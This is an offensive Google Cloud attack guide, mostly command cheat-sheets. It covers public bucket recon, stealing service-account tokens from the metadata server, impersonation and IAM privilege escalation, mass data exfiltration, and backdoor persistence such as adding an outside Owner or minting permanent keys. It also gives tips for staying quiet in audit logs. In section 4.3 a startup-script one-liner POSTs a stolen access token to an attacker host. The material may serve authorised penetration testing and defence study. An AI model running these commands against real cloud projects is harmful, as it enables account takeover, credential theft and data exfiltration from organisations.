# Google Cloud Platform (GCP) Attack Guide

Offensive tradecraft for Google Cloud: external recon, credential acquisition
(metadata server, leaked keys, OAuth scopes), service-account enumeration, the
canonical IAM privilege-escalation paths (largely **service-account impersonation**
+ deploy-as-SA), Cloud Storage abuse, compute/serverless pivots (GCE, Cloud
Functions, Cloud Run, GKE), data exfil, and persistence. Grounded in 2025-2026
tradecraft (Rhino/Praetorian GCP privesc paths, GitLab "Plundering GCP", CloudFox
GCP support, Stratus Red Team, GCPGoat, Mitiga "Tag Your Way In").

> **In GCP, identity is hierarchical and service-account-centric.** The resource
> hierarchy is **Organization → Folder → Project → Resource**, and IAM roles can be
> bound at any level (inherited downward). Most privesc is about **impersonating a
> more powerful service account** or **deploying code that runs *as* one**. The
> permission to watch for everywhere is `iam.serviceAccounts.actAs` /
> `getAccessToken`.

```
Organization
   └── Folder
        └── Project   ← IAM bindings here are the usual blast radius
             ├── Service Accounts (the "users" your code runs as)
             ├── GCE VMs / Cloud Functions / Cloud Run / GKE
             └── Cloud Storage / BigQuery / Secret Manager
```

---

## 0. Identifiers & Token Cheat-Sheet

| Thing | Form |
|-------|------|
| Project ID | human string, e.g. `acme-prod-1234` (distinct from numeric project number) |
| Service account | `name@PROJECT_ID.iam.gserviceaccount.com` |
| SA key (JSON) | downloadable private key — long-lived, high value |
| Access token | OAuth2 bearer (`ya29.…`), short-lived; has **scopes** |
| OAuth scope | e.g. `cloud-platform` (full) vs `devstorage.read_only` (limited) — scope gates a token even if IAM allows more |

---

## 1. Unauthenticated Recon

```bash
# Public Cloud Storage buckets (GCS) — anonymous listing/read
curl "https://storage.googleapis.com/BUCKET"                      # XML list (if public)
gsutil ls gs://BUCKET                                              # if AllUsers/AllAuthenticated
gsutil cp gs://BUCKET/secret.json .                               # anonymous read
# Bucket name guessing (GCPBucketBrute):
# https://github.com/RhinoSecurityLabs/GCPBucketBrute
python3 gcpbucketbrute.py -k acme -u                              # -u = unauthenticated check

# App Engine / Cloud Run / Cloud Functions endpoints in DNS
subfinder -d acme.com -silent | httpx -silent -title \
  | grep -Ei 'appspot.com|run.app|cloudfunctions.net|web.app|firebaseapp.com'

# Firebase misconfig (open Realtime DB / Firestore rules)
curl "https://PROJECT.firebaseio.com/.json"                       # open RTDB = full dump
```

---

## 2. Credential Acquisition

### 2.1 Metadata server (the GCE/GKE SSRF/local pivot)

Every GCE VM, Cloud Run, Cloud Functions, and GKE node can query the **metadata
server** for the access token of the attached service account. By default *any* code
on the box can reach it.

```bash
# Mandatory header on GCP metadata (this is the SSRF filter to bypass)
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# → { "access_token": "ya29...", "expires_in": ..., "token_type": "Bearer" }

# What identity / scopes does this token have?
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"

# High value: startup scripts & project SSH keys & attributes often hold secrets
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script"
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"
```

> **SSRF note:** GCP requires the `Metadata-Flavor: Google` header, so a *naive* blind
> SSRF won't leak tokens — you need header control. Legacy `?alt=json` /
> `X-Google-Metadata-Request: True` paths exist on old endpoints. Always test.

### 2.2 Leaked SA key files & gcloud config

```bash
# Hunt for SA JSON keys in repos / disk / images
gitleaks detect -v
trufflehog filesystem ./ --only-verified
grep -rl '"type": "service_account"' .

# Activate a found key
gcloud auth activate-service-account --key-file key.json
gcloud config list; gcloud auth list

# Existing user/SA creds on disk
ls -la ~/.config/gcloud/        # credentials.db, access_tokens.db, legacy_credentials/
```

### 2.3 Use a stolen access token directly

```bash
export CLOUDSDK_AUTH_ACCESS_TOKEN=ya29....         # gcloud honors this
# or with curl against REST APIs:
curl -H "Authorization: Bearer ya29..." \
  "https://cloudresourcemanager.googleapis.com/v1/projects"
```

---

## 3. Authenticated Enumeration

```bash
# Who am I, what projects, what can I do?
gcloud auth list
gcloud projects list
gcloud config set project <PROJECT_ID>
gcloud projects get-iam-policy <PROJECT_ID>                     # all bindings (members→roles)
gcloud organizations list; gcloud resource-manager folders list --organization <ORG>

# Test your effective permissions on a resource (the precise "can I?" call)
gcloud projects test-iam-permissions <PROJECT_ID> \
  --permissions=iam.serviceAccounts.actAs,resourcemanager.projects.setIamPolicy,storage.objects.get

# Service accounts & their keys (impersonation targets)
gcloud iam service-accounts list
gcloud iam service-accounts get-iam-policy <SA_EMAIL>          # who can impersonate it
gcloud iam roles list --project <PROJECT_ID>                   # custom roles (often over-broad)

# Resource inventory
gcloud compute instances list
gcloud functions list; gcloud run services list
gcloud container clusters list                                 # GKE
gsutil ls
gcloud secrets list
bq ls                                                          # BigQuery datasets
```

```bash
# CloudFox supports GCP — fast attack-path/loot enumeration
# https://github.com/BishopFox/cloudfox
cloudfox gcp --project <PROJECT_ID> all-checks

# ScoutSuite / Prowler for posture mapping
scout gcp --user-account
prowler gcp --project-id <PROJECT_ID>
```

---

## 4. IAM Privilege Escalation

GCP privesc revolves around two ideas: **(a) impersonate a more-powerful service
account**, and **(b) deploy/run code on a resource configured to use one**. Rhino &
Praetorian catalogue ~15-20 primitives; the high-impact ones:

### 4.1 Service-account impersonation (the core primitive)

```bash
# A. iam.serviceAccounts.getAccessToken (Token Creator role) → mint a token AS the target SA
gcloud auth print-access-token --impersonate-service-account=<TARGET_SA>
# or
gcloud projects list --impersonate-service-account=<TARGET_SA>      # run anything as the SA
# REST:
curl -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<TARGET_SA>:generateAccessToken"

# B. iam.serviceAccounts.getOpenIdToken → OIDC token for the SA (federated services)
# C. iam.serviceAccounts.signJwt / signBlob → sign a JWT to assert the SA, then exchange for a token
# D. iam.serviceAccountKeys.create → download a permanent JSON key for the target SA (persistence!)
gcloud iam service-accounts keys create key.json --iam-account=<TARGET_SA>
```

> **`actAs` + `getAccessToken` granted at *project* level = impersonate *any* SA in
> the project.** This is the single most common GCP escalation and is frequently
> over-granted via the **Service Account Token Creator** or **Service Account User**
> roles.

### 4.2 Grant yourself more (direct IAM mutation)

```bash
# resourcemanager.projects.setIamPolicy → add yourself as Owner/Editor
gcloud projects add-iam-policy-binding <PROJECT_ID> \
  --member="user:me@gmail.com" --role="roles/owner"

# iam.roles.update → broaden a custom role you're already bound to
gcloud iam roles update <ROLE> --project <PROJECT_ID> --add-permissions=resourcemanager.projects.setIamPolicy
```

### 4.3 Deploy-as-SA (run code as a privileged service account)

```bash
# Compute: deploy a VM with a privileged SA, then read its token from metadata
gcloud compute instances create esc --zone us-central1-a \
  --service-account=<PRIV_SA> --scopes=cloud-platform \
  --metadata startup-script='curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token | curl -X POST -d @- http://ATTACKER/'

# Run a command on an existing VM you can reach (osLogin / SSH / setMetadata of SSH keys)
gcloud compute instances add-metadata <vm> --zone <z> --metadata-from-file ssh-keys=mykeys.txt

# Cloud Functions: deploy a function that runs AS a chosen SA (cloudfunctions.functions.create + actAs)
gcloud functions deploy esc --runtime python311 --trigger-http --allow-unauthenticated \
  --service-account=<PRIV_SA> --entry-point main --source .
# (function body prints/exfils its own metadata token)

# Cloud Run: same idea
gcloud run deploy esc --image gcr.io/proj/img --service-account=<PRIV_SA> --allow-unauthenticated

# Cloud Build, Composer (Airflow), Deployment Manager, Dataflow, App Engine deploy =
#   additional "run-as-SA" vectors — all hinge on actAs to the privileged SA.
```

### 4.4 Notable 2025 technique — IAM Conditions / tag binding abuse

```text
Mitiga "Tag Your Way In": principals with permission to bind resource tags +
tag-conditioned IAM bindings can satisfy a condition and unlock an otherwise-gated
role grant. Check for tag-based IAM conditions in get-iam-policy output and whether
you hold resourcemanager.tagValues.* / tag binding permissions.
```

---

## 5. Cloud Storage (GCS) Attacks

```bash
gsutil ls                                                    # buckets
gsutil iam get gs://BUCKET                                   # bindings (allUsers? allAuthenticatedUsers?)
gsutil ls -r gs://BUCKET                                     # recursive object listing
gsutil -m cp -r gs://BUCKET ./loot/                          # mass exfil

# Backdoor: make a bucket world-readable (if storage.buckets.setIamPolicy)
gsutil iam ch allUsers:objectViewer gs://BUCKET

# HMAC keys = S3-compatible static creds for a bucket/SA (stealthy persistence)
gsutil hmac create <SA_EMAIL>
```

High-value objects: `terraform.tfstate`, SA key JSONs, `.env`, DB dumps, kubeconfigs,
CI artifacts, app source.

---

## 6. Compute / Serverless / GKE Pivots

```bash
# GCE: list, then run as the box's SA
gcloud compute instances list
gcloud compute ssh <vm> --zone <z>     # if OS Login / SSH key set
# Disk theft: snapshot a VM's disk, attach to your own VM, read secrets
gcloud compute disks snapshot <disk> --zone <z> --snapshot-names loot

# GKE: get cluster creds, then attack the K8s API (see kubernetes-attack-guide)
gcloud container clusters get-credentials <cluster> --zone <z>
kubectl auth can-i --list
# Node SA token: from a pod, hit the node metadata server for the NODE's SA token (often broad)
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# (Workload Identity restricts this; if unset, node SA = whole-project blast radius)
```

---

## 7. Data Stores & Secrets

```bash
gcloud secrets list
gcloud secrets versions access latest --secret=<NAME>
bq query --use_legacy_sql=false 'SELECT * FROM `proj.dataset.table` LIMIT 100'
gcloud sql instances list; gcloud sql users list --instance=<i>
# KMS: what can you decrypt?
gcloud kms keyrings list --location global; gcloud kms keys list --keyring <kr> --location global
```

---

## 8. Persistence

| Technique | Command | T-ID |
|-----------|---------|------|
| SA key (permanent) | `gcloud iam service-accounts keys create k.json --iam-account=<SA>` | T1098.001 |
| Add self as Owner | `gcloud projects add-iam-policy-binding … --role roles/owner` | T1098 |
| HMAC key on a bucket/SA | `gsutil hmac create <SA>` | T1098 |
| Backdoor Cloud Function | scheduled (Cloud Scheduler) priv-SA function | T1053 |
| Custom role broadening | `gcloud iam roles update --add-permissions` | T1098 |
| Tag/condition abuse | bind tag to satisfy conditional grant | T1098 |

---

## 9. Defense Evasion & OPSEC

- **Cloud Audit Logs**: *Admin Activity* logs are always on and non-disableable;
  *Data Access* logs (object reads, secret access) are often off — recon there is
  quieter. `gcloud logging read` to see what's captured.
- Security Command Center, Event Threat Detection, and Chronicle flag SA-key creation,
  external IAM grants, anomalous impersonation, and token use from new geos.
- Impersonation (`generateAccessToken`) is logged with the *delegation chain* — it's
  attributable. Prefer using a token *from the box it belongs to* where possible.
- Creating SA keys is high-signal (orgs often alarm on `iam.serviceAccountKeys.create`).
  Impersonated short-lived tokens are quieter but expire.

---

## 10. Tooling Quick Reference

| Tool | One-liner | Use |
|------|-----------|-----|
| **gcloud / gsutil / bq** | `gcloud projects get-iam-policy <p>` | Native enum + action |
| **CloudFox** | `cloudfox gcp --project <p> all-checks` | Attack-path enumeration + loot |
| **GCPBucketBrute** | `python3 gcpbucketbrute.py -k acme -u` | Public bucket discovery |
| **ScoutSuite** | `scout gcp --user-account` | Posture audit report |
| **Prowler** | `prowler gcp --project-id <p>` | Security/compliance checks |
| **Stratus Red Team** | `stratus detonate gcp.privilege-escalation.impersonate-service-accounts` | Emulate techniques |
| **GCPGoat / GCPGoat labs** | n/a | Practice range |
| **Hayat / GCP IAM Privilege Escalation scripts (Rhino)** | run privesc enum | Find escalatable bindings |

---

## 11. MITRE ATT&CK Mapping

| Technique | ID | Context |
|-----------|-----|---------|
| Valid Accounts: Cloud | T1078.004 | Stolen SA key / token |
| Unsecured Credentials: Cloud Metadata | T1552.005 | Metadata server token |
| Unsecured Credentials: Cloud Instance Config | T1552.001 | Startup scripts, attributes |
| Cloud Infrastructure Discovery | T1580 | GCE/Function/GKE enum |
| Permission Groups Discovery: Cloud | T1069.003 | IAM policy enum |
| Account Manipulation: Add Cloud Creds | T1098.001 | SA key / HMAC creation |
| Use Alternate Auth: App Token | T1550.001 | Impersonation token |
| Data from Cloud Storage | T1530 | GCS exfil |
| Cloud Service Discovery | T1526 | Service inventory |

---

## References

- GitLab — Plundering GCP: Escalating Privileges in Google Cloud Platform: https://about.gitlab.com/blog/plundering-gcp-escalating-privileges-in-google-cloud-platform/
- Praetorian — GCP Service Account-based Privilege Escalation paths: https://www.praetorian.com/blog/google-cloud-platform-gcp-service-account-based-privilege-escalation-paths/
- Rhino Security Labs — GCP IAM Privilege Escalation: https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
- Mitiga — Tag Your Way In (GCP privesc): https://www.mitiga.io/blog/tag-your-way-in-new-privilege-escalation-technique-in-gcp
- Stratus Red Team — GCP techniques: https://stratus-red-team.cloud/attack-techniques/GCP/
- GCPBucketBrute: https://github.com/RhinoSecurityLabs/GCPBucketBrute
- BishopFox CloudFox: https://github.com/BishopFox/cloudfox
- HackTricks Cloud — GCP Pentesting: https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security
- Google — Service account impersonation: https://cloud.google.com/iam/docs/service-account-impersonation
- MITRE ATT&CK Cloud Matrix: https://attack.mitre.org/matrices/enterprise/cloud/
